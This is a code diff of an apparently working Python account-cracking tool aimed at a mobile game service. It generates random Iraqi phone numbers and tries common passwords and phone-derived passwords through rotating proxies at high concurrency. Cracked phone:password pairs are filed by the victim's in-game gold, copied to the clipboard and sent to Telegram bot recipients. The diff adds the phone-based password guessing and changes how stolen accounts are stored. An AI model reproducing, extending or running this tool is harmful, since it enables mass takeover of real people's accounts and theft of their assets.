@@ -68,11 +68,8 @@ CHAT_IDS = []
 MAX_RESULTS = 0
 PROXY_FILE = "/storage/emulated/0/Download/proxyscrape_premium_http_proxies.txt"
 
-# ============================================================
-# متغيرات إضافية
-# ============================================================
-COUNTRY_CODES = ["964", "964", "964"]  # العراق فقط
-COUNTRY_NAMES = ["Iraq", "Iraq", "Iraq"]
+PASSWORDS_IQ = ["qwer1234", "1234qwer", "1q2w3e4r", "qwert12345", "zxcv1234", "12345qwert"]
+PHONE_PASSWORDS = ["077", "078", "079"]
 
 def _aes_cbc(key, iv, pt):
     cipher = AES.new(key, AES.MODE_CBC, iv)
@@ -312,8 +309,6 @@ async def fetch_profile(session, token, user_id, dev, proxy=None):
     
     return None
 
-PASSWORDS_IQ = ["qwer1234", "1234qwer", "1q2w3e4r", "qwert12345", "zxcv1234", "12345qwert"]
-
 stats = defaultdict(int)
 gold_stats = defaultdict(int)
 diamond_stats = defaultdict(int)
@@ -324,116 +319,6 @@ verify_accounts = []
 stats_lock = threading.Lock()
 stop_flag = False
 start_time = time.time()
-
-# ============================================================
-# دوال حفظ الحسابات بتصنيفات مختلفة
-# ============================================================
-def save_account_by_gold(account):
-    """حفظ الحساب في ملف حسب كمية الذهب"""
-    gold = account.get('gold', 0)
-    
-    if gold < 1000000:
-        folder = "gold_0_1M"
-    elif gold < 5000000:
-        folder = "gold_1M_5M"
-    elif gold < 10000000:
-        folder = "gold_5M_10M"
-    elif gold < 50000000:
-        folder = "gold_10M_50M"
-    elif gold < 100000000:
-        folder = "gold_50M_100M"
-    else:
-        folder = "gold_100M_plus"
-    
-    # إنشاء المجلد إذا لم يكن موجوداً
-    os.makedirs(folder, exist_ok=True)
-    
-    # حفظ الرقم والباسورد
-    filepath = os.path.join(folder, "accounts.txt")
-    try:
-        with open(filepath, 'a', encoding='utf-8') as f:
-            f.write(f"{account['phone']}:{account['password']}\n")
-    except:
-        pass
-    
-    # حفظ المعلومات الكاملة
-    full_filepath = os.path.join(folder, "accounts_full.txt")
-    try:
-        with open(full_filepath, 'a', encoding='utf-8') as f:
-            vip_status = "VIP" if account.get('is_vip', False) else "Non-VIP"
-            f.write(f"Phone: {account['phone']} | Pass: {account['password']} | Name: {account.get('name', 'Unknown')} | ID: {account.get('uid', '')} | Gold: {account.get('gold', 0)} | Diamond: {account.get('diamond', 0)} | Level: {account.get('level', 0)} | VIP: {vip_status}\n")
-    except:
-        pass
-    
-    return folder
-
-def save_account_by_diamond(account):
-    """حفظ الحساب في ملف حسب كمية الجواهر"""
-    diamond = account.get('diamond', 0)
-    
-    if diamond < 10000:
-        folder = "diamond_0_10K"
-    elif diamond < 50000:
-        folder = "diamond_10K_50K"
-    elif diamond < 100000:
-        folder = "diamond_50K_100K"
-    elif diamond < 500000:
-        folder = "diamond_100K_500K"
-    elif diamond < 1000000:
-        folder = "diamond_500K_1M"
-    else:
-        folder = "diamond_1M_plus"
-    
-    os.makedirs(folder, exist_ok=True)
-    
-    filepath = os.path.join(folder, "accounts.txt")
-    try:
-        with open(filepath, 'a', encoding='utf-8') as f:
-            f.write(f"{account['phone']}:{account['password']}\n")
-    except:
-        pass
-    
-    return folder
-
-def save_account_by_level(account):
-    """حفظ الحساب في ملف حسب المستوى"""
-    level = account.get('level', 0)
-    
-    if level < 10:
-        folder = "level_0_9"
-    elif level < 20:
-        folder = "level_10_19"
-    elif level < 30:
-        folder = "level_20_29"
-    elif level < 40:
-        folder = "level_30_39"
-    else:
-        folder = "level_40_plus"
-    
-    os.makedirs(folder, exist_ok=True)
-    
-    filepath = os.path.join(folder, "accounts.txt")
-    try:
-        with open(filepath, 'a', encoding='utf-8') as f:
-            f.write(f"{account['phone']}:{account['password']}\n")
-    except:
-        pass
-    
-    return folder
-
-def copy_to_clipboard(text):
-    """نسخ النص إلى الحافظة"""
-    try:
-        pyperclip.copy(text)
-        return True
-    except:
-        try:
-            # محاولة باستخدام طريقة أخرى
-            import subprocess
-            subprocess.run(['termux-clipboard-set', text], capture_output=True)
-            return True
-        except:
-            return False
 
 def save_account_to_file(account, filepath):
     try:
@@ -448,6 +333,34 @@ def save_account_full(account, filepath):
         with open(filepath, 'a', encoding='utf-8') as f:
             vip_status = "VIP" if account.get('is_vip', False) else "Non-VIP"
             f.write(f"Phone: {account['phone']} | Pass: {account['password']} | Name: {account.get('name', 'Unknown')} | ID: {account.get('uid', '')} | Gold: {account.get('gold', 0)} | Diamond: {account.get('diamond', 0)} | Level: {account.get('level', 0)} | VIP: {vip_status}\n")
+        return True
+    except Exception as e:
+        return False
+
+def save_account_by_gold(account):
+    gold = account.get('gold', 0)
+    folder = "accounts_by_gold"
+    os.makedirs(folder, exist_ok=True)
+    
+    if gold < 1000000:
+        filename = f"{folder}/0-1M.txt"
+    elif gold < 5000000:
+        filename = f"{folder}/1M-5M.txt"
+    elif gold < 10000000:
+        filename = f"{folder}/5M-10M.txt"
+    elif gold < 20000000:
+        filename = f"{folder}/10M-20M.txt"
+    elif gold < 50000000:
+        filename = f"{folder}/20M-50M.txt"
+    elif gold < 100000000:
+        filename = f"{folder}/50M-100M.txt"
+    else:
+        filename = f"{folder}/100M+.txt"
+    
+    try:
+        with open(filename, 'a', encoding='utf-8') as f:
+            vip_status = "VIP" if account.get('is_vip', False) else "Non-VIP"
+            f.write(f"Phone: {account['phone']} | Pass: {account['password']} | Gold: {gold:,} | Diamond: {account.get('diamond', 0)} | Level: {account.get('level', 0)} | VIP: {vip_status}\n")
         return True
     except Exception as e:
         return False
@@ -554,6 +467,13 @@ def generate_mobile_iq():
                 used_numbers.add(mobile)
                 return mobile
 
+def copy_to_clipboard(text):
+    try:
+        pyperclip.copy(text)
+        return True
+    except:
+        return False
+
 async def send_telegram_async(session, phone, pwd, name, uid, gold, diamond, level, exp, max_exp, royal, is_vip, vip_type, vip_end_time):
     if not BOT_TOKEN or not CHAT_IDS:
         return False
@@ -588,12 +508,7 @@ async def send_telegram_async(session, phone, pwd, name, uid, gold, diamond, lev
     
     message += f"\n\nBy @to_ls"
     
-    # نسخ الرقم والباسورد إلى الحافظة
-    account_text = f"{phone}:{pwd}"
-    copy_to_clipboard(account_text)
-    
-    if RICH_AVAILABLE:
-        console.print(f"[yellow][📋][/yellow] Copied to clipboard: {account_text}")
+    copy_to_clipboard(f"{phone}:{pwd}")
     
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     all_success = True
@@ -643,12 +558,7 @@ async def send_telegram_verify_async(session, phone, pwd, name, uid, reason):
 
 By @to_ls"""
     
-    # نسخ الرقم والباسورد إلى الحافظة
-    account_text = f"{phone}:{pwd}"
-    copy_to_clipboard(account_text)
-    
-    if RICH_AVAILABLE:
-        console.print(f"[yellow][📋][/yellow] Copied to clipboard: {account_text}")
+    copy_to_clipboard(f"{phone}:{pwd}")
     
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     all_success = True
@@ -689,7 +599,12 @@ By @to_ls"""
 async def check_number_async(session, mobile, semaphore, proxy=None):
     global stats, gold_stats, diamond_stats, level_stats, vip_stats, found_accounts, verify_accounts, stop_flag
     async with semaphore:
-        for pwd in PASSWORDS_IQ:
+        all_passwords = list(PASSWORDS_IQ)
+        
+        for prefix in PHONE_PASSWORDS:
+            all_passwords.append(f"{prefix}{mobile[-8:]}")
+        
+        for pwd in all_passwords:
             if stop_flag:
                 return
             
@@ -814,8 +729,10 @@ async def check_number_async(session, mobile, semaphore, proxy=None):
                             gold_stats["1M-4.9M"] += 1
                         elif gold < 10000000:
                             gold_stats["5M-9.9M"] += 1
+                        elif gold < 20000000:
+                            gold_stats["10M-19M"] += 1
                         elif gold < 50000000:
-                            gold_stats["10M-49M"] += 1
+                            gold_stats["20M-49M"] += 1
                         elif gold < 100000000:
                             gold_stats["50M-99M"] += 1
                         else:
@@ -854,14 +771,9 @@ async def check_number_async(session, mobile, semaphore, proxy=None):
                         
                         found_accounts.append(account_data)
                     
-                    # حفظ الحساب في ملفات التصنيف
-                    gold_folder = save_account_by_gold(account_data)
-                    diamond_folder = save_account_by_diamond(account_data)
-                    level_folder = save_account_by_level(account_data)
-                    
-                    # حفظ في الملفات الأساسية
                     save_account_to_file(account_data, "good_accounts.txt")
                     save_account_full(account_data, "good_accounts_full.txt")
+                    save_account_by_gold(account_data)
                     
                     if RICH_AVAILABLE:
                         console.print(f"\n[green][+][/green] GOOD: [bold green]{mobile}[/bold green] | [bold yellow]{pwd}[/bold yellow]")
@@ -890,7 +802,8 @@ async def check_number_async(session, mobile, semaphore, proxy=None):
                         if proxy:
                             proxy_clean = proxy.split('@')[-1] if '@' in proxy else proxy
                             console.print(f"    Proxy: [dim]{proxy_clean}[/dim]")
-                        console.print(f"    [dim]Saved to: {gold_folder}, {diamond_folder}, {level_folder}[/dim]")
+                        console.print(f"    [dim]Saved to accounts_by_gold/[/dim]")
+                        console.print(f"    [dim]Copied to clipboard: {mobile}:{pwd}[/dim]")
                     else:
                         print(f"\n[+] GOOD: {mobile} | {pwd}")
                         print(f"    Name: {name}")
@@ -918,7 +831,8 @@ async def check_number_async(session, mobile, semaphore, proxy=None):
                         if proxy:
                             proxy_clean = proxy.split('@')[-1] if '@' in proxy else proxy
                             print(f"    Proxy: {proxy_clean}")
-                        print(f"    Saved to: {gold_folder}, {diamond_folder}, {level_folder}")
+                        print(f"    Saved to accounts_by_gold/")
+                        print(f"    Copied to clipboard: {mobile}:{pwd}")
                     
                     if RICH_AVAILABLE:
                         console.print("[yellow][!][/yellow] Sending to all Telegram recipients...")
@@ -986,7 +900,8 @@ def create_dashboard():
         gold_table.add_row("0-999K", str(gold_stats.get('0-999K', 0)))
         gold_table.add_row("1M-4.9M", str(gold_stats.get('1M-4.9M', 0)))
         gold_table.add_row("5M-9.9M", str(gold_stats.get('5M-9.9M', 0)))
-        gold_table.add_row("10M-49M", str(gold_stats.get('10M-49M', 0)))
+        gold_table.add_row("10M-19M", str(gold_stats.get('10M-19M', 0)))
+        gold_table.add_row("20M-49M", str(gold_stats.get('20M-49M', 0)))
         gold_table.add_row("50M-99M", str(gold_stats.get('50M-99M', 0)))
         gold_table.add_row("100M+", str(gold_stats.get('100M+', 0)))
         
@@ -1058,7 +973,8 @@ def create_dashboard():
     0-999K    : {gold_stats.get('0-999K', 0)}
     1M-4.9M   : {gold_stats.get('1M-4.9M', 0)}
     5M-9.9M   : {gold_stats.get('5M-9.9M', 0)}
-    10M-49M   : {gold_stats.get('10M-49M', 0)}
+    10M-19M   : {gold_stats.get('10M-19M', 0)}
+    20M-49M   : {gold_stats.get('20M-49M', 0)}
     50M-99M   : {gold_stats.get('50M-99M', 0)}
     100M+     : {gold_stats.get('100M+', 0)}
 
@@ -1147,13 +1063,8 @@ async def main_async():
         print("[!] No bot token provided, Telegram disabled")
     
     print("\n[+] Starting checker...\n")
-    print("[+] Accounts will be saved in categorized folders:")
-    print("    - gold_*/ (by gold amount)")
-    print("    - diamond_*/ (by diamond amount)")
-    print("    - level_*/ (by level)")
-    print("    - good_accounts.txt (all accounts)")
-    print("    - verification_accounts.txt (accounts needing verification)")
-    print("[+] Phone:Password will be copied to clipboard automatically\n")
+    print("[+] Accounts will be saved in 'accounts_by_gold/' folder by gold amount")
+    print("[+] Passwords will be copied to clipboard automatically\n")
     
     concurrency = 300
     semaphore = asyncio.Semaphore(concurrency)
